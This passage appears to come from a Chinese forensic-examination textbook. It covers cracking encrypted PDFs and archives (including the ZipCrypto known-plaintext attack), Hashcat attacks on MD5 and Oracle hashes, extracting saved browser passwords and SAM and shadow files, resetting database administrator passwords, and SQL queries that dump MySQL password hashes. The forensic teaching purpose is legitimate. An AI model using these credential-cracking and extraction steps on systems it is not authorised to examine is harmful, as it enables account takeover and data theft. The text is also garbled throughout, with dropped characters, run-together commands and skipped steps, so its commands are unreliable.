选择“Decrypt now(即解密）”，软件直接将加密PDF进解密。解密后，可通过PDF查看器或编辑打开验证是否密码已经被移除。

## (三)PDF文档的许可密码移除

对于只设置“许可密码”的PDF档，使PDF档查看器或编辑器打开，在软件的标题中均会显示“已加密”的文字。“许可密码”只是用于管理和控制档的访问权限。

通过“文档属性”可查看“安全性”，在该标签页中，可查看是否存在“文档打开口令”“许可令”“加密级别”以及档的相关权限。要移除PDF档的“许可密码”，可ElcomsoftAdvanced PDF Password Recovery（APDFPR)、Passware Kit Forensic 或其他第三方具备PDF许可密码移除功能的工具。

## 三、压缩文件破解

## (一)压缩文件概述

压缩件(ArchiveFile)也时常被称为“存档件”或“归档件”，它是由个或多个计算机文件以及元数据组成的文件，用于将多个数据文件收集到一个文件中，以便于传输和存储。早期的Linux系统管理员常用工具对多个件进归档或打包，方便集中存储和传输。在国内较多使用者将其称为“压缩文件”。数据压缩是按照特定的编码机制用比未经编码少的数据比特表示信息的过程。数据压缩使用的算法一般称为“压缩算法”，可减少表示数据所需的字节数和存储数据所需的存储空间。

压缩文件通常会存储目录结构、错误检测与纠正信息及注释信息。为了保护数据的安全，压缩文件还支持对压缩包内的特定文件或全部件进加密。目前国内外流的跨平台的压缩文件格式常见的有ZIP、RAR和7Z三大格式。此外，在不同的操作系统平台还有其他更多的文件格式。Windows系统中常用的有CAB、WIM、ARJ和MOU（WinMount)等格式，macOS系统常用的有DMG格式，Linux系统常用的有GZ、DAR、APK、BZ2和LZ等格式。其中APK现在更多在Android智能机系统中使用。

## （二）加密压缩文件破解

加密压缩文件的破解方法基本相似，只需选择加密的压缩包文件，并设置相应的策略即可。以ZIP为例，早期版本存在诸多安全问题，最知名的安全风险就是存在潜在的明文攻击漏洞。ZIP明文攻击主要利用大于12字节的一段已知明文数据进行攻击，从而获取整个加密文档的数据。即如果获得一个未知密码的压缩包和压缩包内某个件的部分明(不定从头开始，确定偏移即可)，那么就可通过这种攻击来解开整个压缩包。比如压缩包里有一个常

见的license件,或者是某个常的dll库，或者是带有固定头部的文件（比如xml、exe、png等容易推导出原始内容的件），那么就可运这种攻击。当然，前提是压缩包是使了ZipCrypto加密。ZipCrypto加密算法是向字节流的（现代对称加密算法是对个分组进加密），它内部使了3个32特的整数来表示密钥，可将它们称为key0,key1和key2。国产部分压缩软件具默认使的Zip加密均存在安全隐患，可通过ElcomSoft ARCHPR、Passware Kit Forensic等密码破解具对其进明攻击破解，与密码的复杂度无关。选择需要破解的加密件（Secrets.zip）、选择明攻击类型和明攻击件（attack.zip），如图18-64所。

![](images/6d0d2fdcc6a468523ee2cc493018f9f1d290d5f860c656639cd16b733387c467.jpg)  
图18-64 ElcomSoftARCHPR破解文件

除ZIP存在明攻击破解外，RAR和7Z均可采常见的字典破解、暴破解、掩码破解及联合破解等式。值得注意的是，部分加密压缩件如采用中字符作为密码，前常用的做法是定义中字典进破解，如图18–65和图18–66所。

![](images/db16ad3fd5da50ad6490346ec46b53c212f9021943dac3e92c2ae9e03a8030aa.jpg)  
图18-65 密码破解设置

![](images/c5d44835aba3de8b1420c36752678b149756ec0d60c6ab4b46b4df562c635160.jpg)  
图18-66 成功解密 RAR文件

## 第五节 哈希类密码破解

哈希函数（Hash function)又称散列算法，是一种输入的数据流生成一个固定长度的“数字指纹”的方法。哈希函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫作哈希值(Hash values)的指纹。常见的哈希算法有MD5、SHA–1、SHA-2、HAVAL、RIPEMD、Tiger、WhirlPool、MD2、MD4、CRC 等。不同的哈希算法有不同的长度，常见的MD5是128比特，SHA-1是160比特。

哈希函数经常用于保护明密码。当个软件或网站系统平台需存储用户的密码时，程序员经常将明文密码转化为哈希值，并存储于数据库中。该数据保护机制可有效保护密码不被泄露，即使软件或网站平台的数据库被窃取，原有用户的密码也能得到保护。

## 一、常见哈希应用

## (—)MD5

MD5消息摘要算法(MD5Message-DigestAlgorithm)，一种被广泛使用的哈希函数，可生成1个128位哈希值，通常以32个十六进制字符表示。MD5由美国密码学家罗纳德·李维斯特（Ronald LinnRivest）设计，于1992年公开，用以取代MD4算法。

在电子数据鉴定中，早期的各种计算机鉴定软件、鉴定硬件设备（硬盘复制机）常用MD5来校验证据文件，确保镜像后的证据文件中的数据与源盘数据一致。

MD5哈希算法除用于件完整性校验、证据件校验外，还经常用于对明密码进保护。根据实际应的情况，开发员编写户密码验证代码时，有时使完整长度的MD5哈希值(32个字符），而有时却只取MD5哈希值中间的16个字符（即第9\~24个字符）。例如管理员设置了密码“admin888”，完整32字符的MD5哈希值为7fef6171469e80d32c0559f88b377245，而16个字符的MD5哈希值则为469e80d32c0559f8。

为了进一步保护明文密码的安全，越来越多的开发人员采用加盐的机制，即将用户的密码与生成随机数组合生成MD5哈希值，数据库则同时存储MD5哈希值和盐值(salt），验证正确性时使用salt结合用户输的密码计算MD5哈希值，再与数据库存储的哈希值比较即可。国际上常见的一些系统平台(如论、管理系统)多采用带salt的MD5哈希算法对明密码进行保护。

## (二)SHA-1

SHA-1(Secure Hash Algorithm 1,安全散列算法1)是一种哈希函数，由美国国家安全局设计，并由美国国家标准技术研究所（NIST)发布为联邦资料处理标准(FIPS)。SHA-1可生成一个160位哈希值，哈希值通常以40个十六进制字符表示。2005年2月，王小云、殷益群及于红波发表了对完整版SHA-1的攻击，只需小于269的计算复杂度，就能找到一组SHA-1哈希碰撞。常见 SHA-1 哈希算法应用于保护明文密码，如MySQL 5.7和 SimpleMachines Forum(SMF)论坛等。

## (三)SHA-2

SHA-2(Secure Hash Algorithm 2,安全散列算法2)是一种密码哈希函数算法，由美国国家安全局研发，由NIST在2001年发布。属于SHA算法之一，是SHA-1 的后继者。SHA-2又细分为六个不同的算法标准，包括：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。最常用的是SHA-256哈希算法，目前SHA-256的安全性得到了全球广泛用户的认可，暂未发现存在相关的安全漏洞。

## 二、哈希类破解

## (一)Hashcat 破解哈希类密码

Hashcat支持丰富的哈希类密码的破解，包括常规MD5、SHA-1、SHA-2及各种带有salt值的哈希类密码破解，如图18–67所示。

![](images/1f47bd850600f62f4a02f52da76d3c43c1fa5d4dc437b79c3e78bcf6e009ea53.jpg)  
图18– 67 Hashcat哈希密码类型支持列表

## 1.基于字典破解MD5 哈希密码

如图18-68所示，命令参考：hashcat-m0-a0d0970714757783e6cf17b26fb8e2298frockyou.txto

## 2.基于字符集暴力破解MD5哈希密码

基于字符集的暴力破解，可通过设置字符集范围参数来指定，字符集范围如下：

字母1：abcdefghijklmnopqrstuvwxyz（小写字母）

字母u：ABCDEFGHIJKLMNOPQRSTUVWXYZ（大写字母）

字母d：0123456789 （数字）

字母h：0123456789abcdef（小写+数字）

字母H：0123456789ABCDEF（大写+数字）

![](images/de488b4818f009a311ebdf1d7716aecd0d3ef4133f7eb70329846f5ebe507de8.jpg)  
图18-68 Hashcat破解MD5哈希

字母s：！"#\$%&()\*+,-/：;<=>?@[\]^_{1}\~

字母a:?1?u?d?s（涵盖所有写字母、写字母、数字及特殊字符）

例1：纯数字(16位)的MD5哈希暴破解，如图18-69所。

命令参考：hashcat -m 0-a3d0970714757783e6cf17b26fb8e2298f --increment--incrementmax=6?d?d?d?d?d?d

![](images/2753eeb7a5f865bd400619ebe92db81da7670a2ba08202a4e76932b731cc6f41.jpg)  
图18-69 纯数字(1至6位)破解MD5哈希

示例2：小写+数字（1至6位）的MD5哈希暴力破解

命令参考：hashcat -m 0 -a 3d0970714757783e6cf17b26fb8e2298f --increment --increment-max=6 ?h?h?h?h?h?h

示例3：大小写+数字（1至6位）的MD5哈希暴力破解

说明：-1?l?u?d代表字符集包含大写字母、小写字母、数字

命令参考：hashcat -m 0-a 3 d0970714757783e6cf17b26fb8e2298f --increment -increment-max=6 -1?1?u?d ?1?1?1?1?1?1

## (二)Passware 破解哈希类密码

Passware Kit Forensic支持多种哈希类密码的破解，然而待破解的哈希值需保存为文本文件，可将一个或多个哈希类密码存储于文本文件，哈希值前加一个“password：”或特定的特征字即可。Passware Kit Forensic 支持常见的哈希算法有：

• MD4, MD5, SHA–1

Windows LM Hash/NTLM Hash

• Unix DES/MD5/SHA-256/SHA-512

• MAC OS X salted SHA–1, SHA–512

示例1：MD5哈希

password:5a105e8b0d40a1329780a62ea2265d8a

示例2：SHA-1哈希

password:7C4A8D09CA3762AF61E59520943DC26494F8941B

示例 3：Windows LM/NTLM 哈希密码

Admin:500:AEBD4DE384C7EC43AAD3B435B51407EE:7A21990FCD3D759941E45C490F1 73D5F::

user01:1000:15E05A3C6D967536C8C9B0C7468727C6:8E90874E5F0C1CA822487EEA0983 CBDC:.

示例4：带有salt 的哈希

user-password: \$MD5 \$salt \$67ale09bb1f83f5007dc119c14d663aa

user-password: \$SHA1p \$salt \$59b3e8d637cf97edbe2384cf59cb7453dfe30789

user-password-another-salt: \$SHA1p \$1234 \$c6adb2d288788e13b78c768c3f71d6cee793f0ce

Paranoiac-SX4AqU8QhsIndmys2r4h:\$SHA1p \$salt \$6df93b557ac2fc7920bb453fd1213c2c32488bdf

示例5：John The Ripper密码

john-password: \$SHA1p \$salt \$59b3e8d637cf97edbe2384cf59cb7453dfe30789

对于Windows密码，可直接将 SAM文件作为加密文件进行破解，然后选择指定用户账户进行破解即可。Linux系统的用户密码破解，也可直接将 shadow文件作为加密文件直接进行用Passware 软件打开，软件将自动解析出用户名列表，可选择用户名直接进行密码破解。

## 第六节 浏览器类密码提取与破解

## 一、Microsoft Edge 浏览器

微软Edge浏览器支持访问密码的自动保存，当用户选择允许自动保存密码后，Edge浏览器会把户输的密码进记录。打开Edge浏览器中的“设置”，选择“个资料”中的“密码”，或直接在地址栏输“edge://settings/passwords”，可直接访问保存的密码的窗视图，如图18-70所。要显保存在Edge浏览器中的密码，输Windows系统的户名和密码进安全验证，验证成功后，即可查看缓存密码明，也可使WebBrowserPassView查看缓存密码，如图18-71所示。

![](images/07530bdca93065271c9276ff464fee232452ec34dcf69eca12b2a3b5e4741751.jpg)  
图18-70 Edge浏览器缓存的密码

![](images/b2da1fd04551a8904f4da92fa144cd98af302ce87a7881c9421cd602965f5c31.jpg)  
图18-71 使WebBrowserPassView查看缓存密码

## 二、Chrome浏览器

Chrome浏览器持将户输的密码进保存,将其缓存到本地浏览器中。在Windows开机运状态或通过动态仿真进分析时，可直接打开浏览器,通过“设置”中的“动填充”，或在地址栏中输“chrome://settings/passwords”，点击要查看的缓存项的密码，输Windows系统用户的密码，即可查看Chrome缓存的密码，如图18-72所示。也可通过Nirsoft具集中的ChromePass或WebBrowserPassView均可在开机状态直接提取Chrome浏览器中缓存的明密码,如图18–73所。该密码对应的数据件为：\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data

![](images/fe690385f82a3c8b05e996222d8308643d60f667c142809cd50e2d66c1089d2c.jpg)  
图18-72 开机运状态查看Chrome缓存的密码

![](images/ce38c0a652e32b838672cd206c2c14a7ea0fa16eee6e1548b4ace0732f09c08a.jpg)  
图18-73 ChromePass直接提取并查看缓存的密码

## 三、Firefox浏览器

打开Firefox后在“设置”中的“隐私与安全”下找到“已保存的登录信息”，点击并进后，可查看所有缓存的登录账户及密码内容。也可通过地址栏输about:logins直接访问。Firefox本地缓存的站点密码信息,通过点击密码边上的“眼睛”图标可直接查看缓存的密码，须输Windows户密码,如图18-74所。

通过Nirsoft具集中的PasswordFox或WebBrowserPassView可在开机状态直接提取Firefox浏览器中缓存的明密码，如图18-75所。

Firefox浏览器缓存密码相关的件名为：\Users\<username>\AppData\Roaming\Mozilla\ Firefox\Profiles\<ID>.default-release\logins.json,如图18–76所示。

![](images/925b95624aa4355fb1ce1457d17ecf2f551f54a1610075e9ef35680d90638d96.jpg)  
图18-74查看Firefox缓存密码

![](images/2569b3314d3d501f4cd648aa397a06c53a181f0b74005050f4ddf7c6aee35e6a.jpg)  
图18-75 使PasswordFox查看缓存密码

![](images/d1ac6449dc01ecba3b5a5bfb04f8752dceebbf3bec481f3f0a15d3b789e93732.jpg)  
图18–76 查看logins.json件内容

## 四、浏览器密码提取及破解具

## (—) Passware Kit Forensic

PasswareKitForensic内置多种主流浏览器的缓存信息提取，包括站点名称、户名和密码，支持IE、Edge、Firefox、Safari、Opera和Yandex等浏览器，如图18–77所示。

![](images/2a331682086dd52c0a7a69b7f1d747045fcfaf2493a9a1b21abdabaa46946423.jpg)  
图18-77 站点缓存信息提取(Websites)

## (二）Elcomsoft Internet Password Breaker

Elcomsoft InternetPasswordBreaker是Elcomsoft旗下的款针对浏览器及邮件客户端的数据解密及缓存密码提取工具。支持了IE、Edge、Chrome/Chromium、Opera、Firefox、Safari、Yandex浏览器、360浏览器、QQ浏览器、UC浏览器及Tor浏览器的各种缓存信息提取（包括户名和密码等）。此外还持Outlook、LiveMail/WindowsMail和ThunderBird等邮件客户端缓存信息提取（邮箱户名和密码），如图18-78所。

![](images/05790df914a9ecae7a5604ad34bec2de772b89d89cf18ec02cce5cebcb7a1090.jpg)  
图18–78 Elcomsoft Internet Password Breaker主界面

选择指定浏览器类型即可动对缓存的站点、户名及密码信息进提取和显。

## 第七节 数据库加密破解

## 、MySQL数据库

MySQL由于性能、成本低、可靠性好，成为最流的开源数据库。MySQL服务默认使3306端,安装后默认内置root超级管理员账户，需配置持本地访问或远程访问。

MySQL持多种存储引擎，主要包括MyISAM和InnoDB引擎。MyISAM拥有较的插、查询速度，但不支持事务。在MySQL5.5.5之前的版本中，MyISAM是默认的存储引擎。MySQL5.5.5之后，InnoDB作为默认的存储引擎。

使MyISAM引擎创建数据库,将产3个件。件的名字以表的名字开始，扩展名指出件类型：表定义文件为.frm，数据件的扩展名为.MYD（MYData），索引件的扩展名是.MYI(MYIndex)。

## (）Windows系统MySQL重置密码

1）停MySQL服务：netstopmysql80（Windows命令窗执该命令）；

2）更改MySQL配置件,如图18-79所。

![](images/358da7335efef07e84667e77e8bb8e64f5065221392e6a51e857541aaf63804e.jpg)  
图18–79 Windows下更改MySQL配置件

•Windows下在MySQL配置件 my.ini(默认路径C:\ProgramData\MySQL\MySQL Server8.0\my.ini)中[mysqld]后添加skip-grant-tables。

Windows：直接记事本编辑my.ini。

3）重置root管理员密码的两种法。

a）法1：执命令：

mysqld -defaults-file="C: \\ProgramData\\MySQL\MySQL Server 8.0\ \my.ini"

b）方法2:执行如下命令：

mysql-uroot（输该条命令后直接按回车键）

mysql> flush privileges;

net startmysql80(开启mysql服务，在原来的终端执)

```batch
mysql -u root -p 12345678
```

## (）Linux系统MySQL重置密码

1）停mysql服务：执命令：service mysqlstop（以Ubuntu系统为例）

2）更改MySQL配置件：Linux下MySQL配置件mysqld.cnf（默认路径/etc/mysql/mysql.conf.d/mysqld.cnf)。需要注意的是，不同的Linux系统MySQL配置件的件名和件存放路径不样。可使vi、vim或gedit命令来修改mysqld.cnf的内容，如图18-80所示。

执行命令：gedit /etc/mysql/mysql.conf.d/mysqld.cnf

![](images/8836600bfda0a3db3d89fccf2a1ce22ef13f572b82ae934d5ba2583ecd62e256.jpg)  
图18-80 Ubuntu下更改MySQL配置件

3）重新启动mysql服务，执命令：

service mysql restart

mysql(直接回车进)

mysql> flush privileges

mysql> alter user 'root'@'localhost'identified by'147258369';

需要注意的是,若出现Your password does not satisfy the current policy requirements的报错信息，说明新密码不符合MySQL设定的密码策略，分别执setglobal validate_password.policy=0；setglobal validate_password.length=1；两条命令，再重新修改密码命令即可，如图18-81所示。

## （三）MySQL数据库户密码哈希提取法

在MySQL数据库存储的密码哈希并不是标准的哈希值，因此要准确提取MySQL户密码哈希，还需进数据处理。MySQLv4.1+或MySQL5版本使用的是两遍SHA-1哈希算法，而MySQLv8.0.4版本开始，使的是标准SHA-256哈希算法或基于SHA-256的变种算法。

![](images/77d5a6f09a37a982d445f48ddca11b39921d93f324b91116522f59cbeb0f8f60.jpg)  
图18-81 使用新密码登录MySQL

MySQL5.7默认使mysql_native_password份认证插件，可使以下命令来提取户密码哈希值(SHA-1)。

% mysql -Ns -uroot -e "SELECT SUBSTR(authentication_string, 2) AS hash FROM mysql.user WHERE plugin ='mysql_native_password'AND authentication_string NOT LIKE %THISISNOTAVALIDPASSWORD%•AND authentication_string!=";"> sha1_hashes

MySQL8.0默认两种算法，种是标准SHA-256,种则是caching_sha2_password（基于SHA-256的算法）。如数据库采的是caching_sha2_password算法，则可使caching_sha2_password份认证插件,并使以下命令来提取户密码哈希值,如图18–82和图1883所。

![](images/7da465bb1e1cdc1e0327de202ffecd0b8afc0b0308d2bc7e7f534b3ff86cea8b.jpg)  
图18-82 SQL语句直接查询authentication_string

![](images/27b74da1110393eefb32f26f98dc9308883b655bd1d425df9b82eb97c2b11fb9.jpg)  
图18-83MySQLv8户密码哈希提取

%mysql -Ns-uroot-e "SELECT CONCAT(\ \$mysql', LEFT(authentication_string,6), \*',INSERT(HEX(SUBSTR(authentication_string, 8)), 41,0,'\*)）AS hash FROM mysql.user WHERE plugin = 'caching_sha2_password'AND authentication_string NOT LIKE

%INVALIDSALTANDPASSWORD%'AND authentication_string！=";">sha256_hashes

## （四）Hashcat破解MySQL户密码

基于目前最新的Hashcat版本（v6.2.6.7），目前仅支持3种类型的MySQL用户密码哈希破解，其中2种是数据库密码哈希，1种为络通讯获取的密码哈希，见表18–4。

表18-4 Hashcat支持的MySQL密码哈希类型
<table><tr><td>哈希类型 ID</td><td>版本</td><td>类型</td></tr><tr><td>200</td><td>MySQL323</td><td>Database Server</td></tr><tr><td>300</td><td>MySQL4.1/MySQL5</td><td>Database Server</td></tr><tr><td>11200</td><td>MySQL CRAM (SHA1)</td><td>Network Protocols</td></tr></table>

## 二、MS SQLServer数据库

MicrosoftSQLServer(简称MSSQL)安全性主要是指允许那些具有相应的数据访问权限的户能够登录到MicrosoftSQLServer并访问数据以及对数据库对象实施各种权限范围内的操作，同时拒绝所有授权户的法操作。因此，安全性管理与户管理是密不可分的。MicrosoftSQLServer提供了内置的安全性和数据保护，系统默认的管理员账户为“sa”。

## 1.使用命令行重置sa密码

1）以管理员份运cmd.exe,输osql-L,查看服务器列表,如图18-84所。

![](images/c996f4e8492522c082cccb950a92752b130e22e6c57122e7836481f746275e1e.jpg)  
图18-84服务器列表信息

获得服务器信息后，使命令进服务器。参考命令：OSQL-S[服务器名称-E

2）重置sa密码，参考命令：

sp_password NULL，[新密码，sa’

GO

3）使新密码登录服务器。

## 2.增加新用户登录服务器修改sa密码

1）停SQL Server服务,参考命令：net stop"SQL Server（SQLEXPRESS)"

以单户模式启动SQLServer服务,参考命令：net start"SQL Server（SQLEXPRESS)"/m

2）创建具有sa权限的新户,参考命令：

sqlcmd -S.   
Use master   
Go

3）重启SQLServer服务,参考命令：

5）在服务器引擎中选择“安全性”,选择“登录名”,右键点击sa户,在下拉菜单中选择“属性”，打开登录属性界，修改密码,如图18-85所。

![](images/49f4a28d13766cf406e0a9508bfc83cba42b1db9b530715ce8ac768323c53680.jpg)  
图18-85 sa用户登录属性

6）使新密码登录。

## 三、Oracle数据库

Oracle数据库（又名OracleRDBMS,简称Oracle)是甲公司的款关系数据库管理系统。个Oracle数据库系统是以个由字母和数字组成的系统标识符(SID，SiteID)来做唯性的区别包含了少个应程序的实例和资料存储设备。

Oracle关系型数据库管理系统从逻辑上把数据保存在表空间内，在物理上以数据件的形式存储。表空间可以包含多种类型的存储区块，例如数据区块（DataSegment）、索引区块(IndexSegment)等等。区块相应地由个或多个扩展(Extent)组成。扩展由相连的数据区块组成。数据区块是数据存储的基本单元。Oracle数据库管理系统通过存储在SYSTEM表空间内的信息来跟踪数据存储。

Oracle系统中常见的有两个系统管理账户，分别是sys和system。户sys拥有dba、sysdba和sysoper或权限，是Oracle数据库系统中权限最的户，只能以sysdba或sysoper登录，不能以normal形式登录。户system拥有dba、sysdba权限或，可以以普通户的份登录。

## 1.Oracle重置用户密码

1）使SQLPlus具进登录。

2）以sysdba免密码登录，此处须输令，直接回车即可，如图1886所。

![](images/47e26e4e7010b27aa078a58e58efcf664a5dc11f3ecabdaec6c59d2e42ed8c5d.jpg)  
图18-86 以sysdba身份进行免密码登录

3）重置管理员账户“system”密码为“BDoracle2023”,如图18-87所。   
参考命令：alter user username identified by "password";   
注：username为待修改的户,password为新密码。

![](images/3534181df685f89065b2e65f82b78a352fbe76ed5c14753e2c81aa1a2076d8ee.jpg)  
图18-87 密码已成功更改

## 2.Hashcat破解Oracle数据库户密码

使Hashcat-h可查询其持的密码类型，其中包含3个Oracle密码类型(表18-5）。3100是Oracle7\~10版本;112适于Oracle11+,12300适于Oracle12版本,如图18–88所。

表18-5Hashcat支持的Oracle密码类型
<table><tr><td>密码类型ID</td><td>Oracle 版本</td><td>类别</td></tr><tr><td>3100</td><td>Oracle H: Type (Oracle 7+)</td><td>Database Server</td></tr><tr><td>112</td><td>Oracle S: Type(Oracle 11+)</td><td>Database Server</td></tr><tr><td>12300</td><td>Oracle T: Type (Oracle 12+)</td><td>Database Server</td></tr></table>

![](images/280e8b294fdbca4dc47e368c23c24c9b73c7f9523b0e856b5fd27d954e8e8e15.jpg)  
图18-88 Oracle11g数据库中的system户密码哈希

Oracle10/11/12版本的户密码哈希例：

• Oracle10：0EDE56329E1D82EA：SCOTT

• Oracle11：960b7bcef95e6a3f4f0e828726d4fa3d2a6edcd5：26510491a3524afa2913

•Oracle12:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C

1）破解Oracle10户密码（基于rockyou字典），如图18-89所。

参考命令：hashcat.exe -m 3100-a00EDE56329E1D82EA：SCOTT rockyou.txt -force

![](images/04ebce007c8b2ae7a673e83ae6026c312dd48b44d48fcbaa40ddd9a0216b6535.jpg)  
图18-89Hashcat破解Oracle10数据库用户密码

2）破解Oracle11户密码（基于rockyou字典），如图18-90所。

参考命令：hashcat.exe-m112-a0960b7bcef95e6a3f4f0e828726d4fa3d2a6edcd5:265104 91a3524afa2913 rockyou.txt --force

![](images/a93d59cf9d6ece23d9845feac65e3f62d2e3ba7c0ddddab52e2c3b840a1dbf42.jpg)  
图18-90 Hashcat破解Oracle 11数据库用户密码

3）破解Oracle12户密码（基于rockyou字典），如图18-91所。

参考命令：hashcat.exe -m12300-a023D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22Crockyou.txt--force

![](images/27c9755cd6ee8b08db9c7476f04374f12c148e85a7d2ab273bcb2304ba6f2ee2.jpg)  
图18-91 Hashcat破解Oracle12数据库户密码

## 第八节 小结

随着户安全意识的提，越来越多涉案检材涉及加密档、加密磁盘及哈希类相关密钥破解。在电子数据司法鉴定中，鉴定人需熟悉常见的加密应用种类、加密算法以及密码破解的多种法。

在司法鉴定实践中，鉴定人需熟悉相关的密码破解工具的使用，熟悉至少2—3款密码破解软件，可对同类工具软件进行横向功能对比、性能对比等，并在实践中选择适用的密码破解工具。

密码破解可使用彩虹表、字典、暴力破解、明攻击及联合破解等式。此外，计算机中缓存密码（浏览器、邮件客户端等）、物理内置中的密钥提取对于破解加密件或加密磁盘可以起到辅助作用。

随着TPM加密芯和苹果T2芯的应，早期拆计算机硬盘进镜像获取的式已经不适，需采免拆机式进现场解密并制作硬盘解密数据镜像。此外，可结合内存直接访问(DMA)技术绕过系统密码，提取可于解密数据的密钥信息（如BitLocker恢复密钥）。司法鉴定员开展此类作时可参考中华民共和国司法政业标准SF/T01052021《存储介质数据镜像技术规程》中的7.3加密存储介质处理。

鉴定人员需与时俱进，需不断了解新型加密应用，学习密码破解新技术、新方法，并关注国内外主流密码破解软件的最新技术突破和动态，才能对涉加密类检材的数据提取、解密和分析更加得应。

![](images/5e898847fa9ebd65d26d2ce10f6481b823557ead4cf5ba25a2c26cabe15735c7.jpg)

## •思考题·

1.Windows系统对选定的卷启用BitLocker加密时，导出的恢复密钥文件默认采用什么编码进行存储?

2.目前主流的笔记本电脑内置的加密芯的全称及英文缩写是什么？

3.Windows10/11系统哪个件存储了户账号及其密码哈希信息？

4.Linux系统管理员忘记了管理员账户的密码，可使用什么模式来重置密码?

5.苹果macOS系统也有使用类似Windows系统的BitLocker卷加密机制，其中文和英文名称分别是什么？

## 第十九章 程序功能鉴定

## 第一节 程序功能鉴定概述

程序功能鉴定，作为电子数据功能性鉴定中的重要组成部分，在网络犯罪案件的鉴定委托中较为常见。此类案件中，涉案软件往往扮演着关键角，嫌疑人利用手机应用程序或计算机程序，非法入侵、控制他人系统，进而窃取、篡改或增删系统数据，以满足其非法目的。办案部门在调查过程中，特别关注以下问题：嫌疑人使用的程序是否在未经授权的情况下对其计算机设备进访问或控制操作；该程序是否通过非常规途径获取计算机系统中其他程序的数据；以及是否对系统中其他程序的数据进了篡改。以上这些程序的功能及其具体实现方法，都是办案部门关注的重点。因此，办案部门经常需要委托鉴定机构对涉案程序进功能性鉴定，鉴定意见书中对涉案程序功能的描述将成为影响法院最终定罪的重要依据。

此外，当企业因网络黑灰产产业链遭受损失，或委托开发的系统未达到合同要求时，为了获取合规且具有法律效力的证据，企业亦会产生对相关程序进行功能性鉴定的需求。例如，企业常因第三实施的各种形式的“薅”为承受损失，为保护权益寻求鉴定机构帮助，对他们当前掌握的情况以及相关程序进分析,通过司法鉴定的形式对该“薅”为涉及的程序、服务器逻辑进行鉴定和分析，以提供重要依据。

## 一、程序功能鉴定的常用工具

## (一)计算机程序功能鉴定工具

## 1.虚拟环境搭建工具

在计算机程序功能鉴定过程中，为保证鉴定工作的可控性，一般情况下需要在虚拟环境中进行，虚拟环境一般搭建在虚拟机内部，以实现安全、隔离的测试环境。虚拟机软件旨在协助户在单物理计算机上构建并管理多个虚拟机，此软件能帮助鉴定员同时运并操作具备不同架构及操作系统的虚拟机实例。

VMwareWorkStation系列是应用最为泛的虚拟机软件。它持户在单的桌上同时运行不同的操作系统，是进行程序功能鉴定的最佳选择。VMwareWorkStation可在一部实体机器上模拟完整的络环境，其灵活性与先进的技术胜过了市上其他虚拟计算机软件。该软件提供收费的正式版，同时也提供免费的试用版。VMwareWorkStation Pro官方下载地址:https://www.vmware.com/cn/products/workstation-pro.html。

## 2.PE信息查看工具

ExeinfoPE是款来查看PE件信息的具，可查看EXE/DLL件的编译器信息、检测件是否加壳、展示口点地址、输出表/输表等PE信息，帮助开发人员对程序进分析和逆向,ExeinfoPE官方下载地址：http://exeinfo.booomhost.com/。

## 3.进程监听工具

在Windows操作系统环境下，微软公司提供了Windows事件跟踪服务（EventTracing forWindows，简称WindowsETW)接口，并提供了官方进程监视器ProcessMonitor。通过该工具，我们关注的程序行为主要包含以下四类：①进程、线程的创建、启动、终止等操作；②对文件系统的操作;③注册表操作;④网络行为。该工具可从微软官方网站免费下载使用，ProcessMonitor官方下载地址：htps://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon。

## 4.网络行为分析工具

论是客户端程序还是恶意马程序，网络都是重要的传播、控制媒介。客户端程序通过网络接收服务器下发策略、上传本地数据；而木马程序则向远程服务端发送连接请求。捕捉到这些络为将有助于我们对程序整体功能的深研究。Wireshark是种免费的开源络协议分析工具，Wireshark官方下载地址：http://www.wireshark.org/download.html。该软件的前是著名的开源跨平台协议分析具Ethereal。

在Wireshark中，可通过编写过滤器语句对监听内容进过滤，如：

ip.host==192.168.0.139//监听与IP地址为192.168.0.139的有关的通信内容；

tcp.port==53//显示TCP端口号为53（DNS协议)的通信内容；

udp.port==53//显UDP端号为53(DNS协议)的通信内容。

## 5.静态代码分析工具

当对程序代码及运逻辑进深分析时，需要对程序的可执件（如EXE件）或动态链接库(DLL件等)进反编译。此过程旨在将可执件中的机器语转换为汇编代码或伪代码，从而查看其引的库文件和库函数。通过此种代码分析方式，可对程序的功能进进步分析。

IDAPro是一款交互式的、可编程的、可扩展的、多处理器的、功能极其强大的逆向工程分析工具，内置大量的API函数库，可准确识别各类系统函数，并提供多种辅助视图方式，为分析作提供了很多便利。前，IDAPro是应最泛的分析具软件之,IDAPro官下载地址：https://hex-rays.com/IDA-pro/。

## 6.动态调试工具

动态调试是指利调试器(Debugger)跟踪软件的运，通过下断点、监控内存、堆栈和单步执函数调用等方式，对目标程序执过程中的函数调用执的操作等进深分析。下面介绍2款常的动态调试软件：

(1) OllyDbg OllyDbg是使用最为泛的32位Windows程序反汇编调试工具，其主界面由反汇编窗、寄存器窗口、信息窗口、数据窗口和堆栈窗口组成。OllyDbg作为一款强大的反汇编调试工具，功能强但存在重的缺陷：它仅限于调试32位程序。

(2)x64dbg x64dbg是款同时持32位和64位程序反汇编调试开源调试具，x64dbg 官方下载地址为：htps://sourceforge.net/projects/x64dbg/files/snapshots/。x64dbg的窗布局与OllyDbg相似，其主要快捷键也与OllyDbg相近。软件的法可参考x64dbg参考手册：htps://help.x64dbg.com/en/latest/。

## （二）移动终端程序功能鉴定工具

## 1.APK基本信息查看工具

在开启APP鉴定工作前，为确保安全性和完整性，除校验Hash值外，还需查看APK的一些基本信息，如是否加壳、版本号、权限、所持运的Android版本范围等。可使APK

Messenger具查看上述信息。APKMessenger是款运在Windows环境下的APK信息提取工具，APK Messenger 官方下载地址：https://www.ghxi.com/apkinfo.html。

## 2.Android 模拟器

